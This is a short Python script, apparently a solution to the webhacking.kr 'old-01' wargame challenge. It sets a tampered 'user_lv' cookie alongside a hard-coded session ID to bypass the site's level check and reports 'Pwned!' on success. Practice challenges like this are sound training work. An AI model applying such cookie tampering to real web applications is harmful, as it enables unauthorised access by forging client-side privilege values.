import requests

url = "https://webhacking.kr/challenge/web-01/"
cookies = {"PHPSESSID":"jacnu6dl7s8r6m2fp6uuf7bq40","user_lv":""}

def solve():
    cookies["user_lv"]="3.5"
    res = requests.get(url,cookies=cookies)
    if "old-01 Pwned!" in res.text:
        print("old-01 Pwned!")
    elif 'already solve' in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()


